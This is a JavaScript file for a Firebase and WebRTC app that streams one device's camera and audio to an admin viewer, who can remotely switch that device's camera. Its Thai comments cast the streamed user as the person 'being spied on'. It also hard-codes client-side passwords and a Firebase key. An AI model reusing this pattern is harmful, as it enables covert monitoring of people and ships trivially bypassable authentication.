const firebaseConfig = {
    apiKey: "AIzaSyAnPDK7to2DWFnti490ri8YRCBkpTajOHY",
    authDomain: "pokdeng-61c5e.firebaseapp.com",
    databaseURL: "https://pokdeng-61c5e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pokdeng-61c5e",
    storageBucket: "pokdeng-61c5e.firebasestorage.app",
    messagingSenderId: "518814980796",
    appId: "1:518814980796:web:32b310d1a0b2bc7d058eb9"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const pcConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

let isAdmin = false;
let currentFacingMode = "user"; 
let localStream = null;
let peerConnection = null;

function checkLogin() {
    const pass = document.getElementById('pass-input').value;
    if (pass === "admin1234") { 
        isAdmin = true;
        document.getElementById('admin-panel').style.display = "block";
        document.getElementById('login-overlay').style.display = "none";
        // Admin รอให้ User ออนไลน์ก่อนค่อยกดเชื่อมต่อผ่าน UI หรือรอฟังสัญญาณ
        initAdminLogic();
    } else if (pass === "user") { 
        isAdmin = false;
        document.getElementById('login-overlay').style.display = "none";
        initUserLogic();
    } else {
        alert("รหัสผ่านไม่ถูกต้อง!");
    }
}

// --- ฝั่ง USER (ผู้ถูกส่อง) ---
async function initUserLogic() {
    peerConnection = new RTCPeerConnection(pcConfig);
    
    // 1. เริ่มกล้อง
    localStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: currentFacingMode },
        audio: true
    });
    document.getElementById('localVideo').srcObject = localStream;
    localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));

    // 2. ส่ง ICE Candidates
    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            database.ref('ice_candidates/user').push(event.candidate.toJSON());
        }
    };

    // 3. สร้าง Offer
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    await database.ref('stream_signal/offer').set({ type: offer.type, sdp: offer.sdp });

    // 4. รอรับ Answer จาก Admin
    database.ref('stream_signal/answer').on('value', async (snap) => {
        if (snap.exists() && !peerConnection.currentRemoteDescription) {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
        }
    });

    // 5. รับ ICE จาก Admin
    database.ref('ice_candidates/admin').on('child_added', (snap) => {
        peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
    });

    // ฟังคำสั่งสลับกล้อง
    database.ref('camera_control').on('value', async (snap) => {
        const mode = snap.val()?.facingMode;
        if (mode && mode !== currentFacingMode) {
            currentFacingMode = mode;
            location.reload(); // วิธีที่ชัวร์ที่สุดในการสลับกล้องคือรีโหลด Media
        }
    });
}

// --- ฝั่ง ADMIN (ผู้ส่อง) ---
function initAdminLogic() {
    peerConnection = new RTCPeerConnection(pcConfig);

    peerConnection.ontrack = (event) => {
        console.log("ได้รับ Stream แล้ว!");
        document.getElementById('remoteVideo').srcObject = event.streams[0];
    };

    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            database.ref('ice_candidates/admin').push(event.candidate.toJSON());
        }
    };

    // รอรับ Offer จาก User
    database.ref('stream_signal/offer').on('value', async (snap) => {
        if (snap.exists()) {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            database.ref('stream_signal/answer').set({ type: answer.type, sdp: answer.sdp });
        }
    });

    // รับ ICE จาก User
    database.ref('ice_candidates/user').on('child_added', (snap) => {
        peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
    });
}

function switchCamera() {
    const newMode = currentFacingMode === "user" ? "environment" : "user";
    database.ref('camera_control').set({ facingMode: newMode });
}
